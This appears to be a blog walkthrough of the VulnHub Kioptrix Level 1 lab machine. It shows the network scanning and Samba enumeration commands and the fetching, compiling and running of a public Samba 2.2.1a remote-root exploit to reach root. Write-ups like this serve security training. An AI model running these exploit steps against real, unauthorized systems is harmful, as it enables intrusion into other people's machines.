---
title: "Vulhub-Kiotrix Level 1 Walkthrough"
date: 2024-01-24
categories: [Vulnhub, CTF ]
image: /assets/Kioptrix_Cover.jpg
tags: [Kioptrix, Boot2Root, Penetration Testing, Samba Exploit]
description: "A walkthrough for hacking the vulnerable machine Kioptrix Level 1 from VulnHub."
active: true
---

<script>
  // Set to `false` if the machine is active and writeup should be hidden
  const isRetired = true;

  document.addEventListener("DOMContentLoaded", function () {
    const walkthrough = document.getElementById("walkthrough");
    const warning = document.getElementById("retirement-warning");

    if (isRetired) {
      walkthrough.style.display = "block";
      warning.style.display = "none";
    } else {
      walkthrough.style.display = "none";
      warning.style.display = "block";
    }
  });
</script>

<div id="retirement-warning" style="display:none; border: 1px solid #f00; padding: 1em; background: #fee;">
  <h2>🚫 Walkthrough Not Available</h2>
  <p>This machine is still active. Write-ups are restricted until it is retired.</p>
  <p>Please review <a href="https://help.hackthebox.com/en/articles/5184601-writeups-policy" target="_blank">HTB’s write-up policy</a> for more info.</p>
</div>

<div id="walkthrough" style="display:none;">

## Introduction
Welcome to the Kiotrix Level 1 challenge. This is a walkthrough for hacking the vulnerable machine **Kioptrix Level 1** from VulnHub. There are various ways to root this box, and I will keep the process clear and concise. Let's get started.

## Challenge Details
- **Name:** Kiotrix Level 1  
- **Category:** Boot2Root  
- **Difficulty:** Easy  

## Prerequisites
Before you begin, ensure that you have the following:
- **Kali Linux** or any other preferred penetration testing distribution.
- **Kioptrix Level 1 VM** installed and running.
![Kioptrix VM Running](../assets/1kioprix.png)


## Walkthrough
### Step 1: Reconnaissance
#### Network Discovery and Setup
Execute the following command on your attack machine to check if Kioptrix Level 1 is on the network:
```bash
arp-scan -l
```
If Kioptrix is not detected, troubleshoot and ensure it is installed correctly.
![Kioptrix VM Running](../assets/2kioptrix.png)
Identified IP address:
```bash
192.168.10.171
```

### Step 2: Enumeration
Run an Nmap scan to identify open ports and services:
```bash
nmap -A -p- -T4 192.168.10.171
```
The results show that **port 80 is open**, displaying a test page in the browser.
![Kioptrix VM Running](../assets/4kioptrix.png)
![Kioptrix VM Running](../assets/3kioptrix.png)
Additionally, **Samba service** is detected, which will be crucial for privilege escalation.

### Step 3: Samba Enumeration
Utilize `enum4linux` and `smbclient` to confirm the presence of Samba on the remote host.
![Kioptrix VM Running](../assets/5kioptrix.png)
Start Metasploit and use the auxiliary scanner:
![Kioptrix VM Running](../assets/6kioptrix.png)
```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.10.171
run
```
![Kioptrix VM Running](../assets/6kioptrix.png)
The results show that **Samba 2.2.1a** is running, which is vulnerable to multiple exploits.

### Step 4: Exploitation - Samba 2.2.1a
Search for available exploits using `searchsploit`:
```bash
searchsploit samba 2.2.1a
```
The results show multiple exploits, and we choose `multiple/remote/10.c`.
![Kioptrix VM Running](../assets/9kioptrix.png)
Download the exploit:
```bash
searchsploit -m multiple/remote/10.c
```
![Kioptrix VM Running](../assets/10kioptrix.png)
Compile the exploit:
```bash
gcc -o sambaexploit 10.c
```
![Kioptrix VM Running](../assets/11kioptrix.png)
Execute the exploit:
```bash
./sambaexploit -b 192.168.10.171
```
![Kioptrix VM Running](../assets/12kioptrix.png)
After execution, verify root access:
```bash
whoami
```
![Kioptrix VM Running](../assets/13kioptrix.png)
![Kioptrix VM Running](../assets/14kioptrix.png)
## Conclusion
You've successfully completed Kiotrix Level 1. This walkthrough provided a step-by-step guide to solving the challenge. If you encountered any issues or have questions, feel free to reach out!

Remember to document and understand the techniques used, as they may be helpful in future CTFs. **Happy hacking!**
</div> <!-- End walkthrough -->
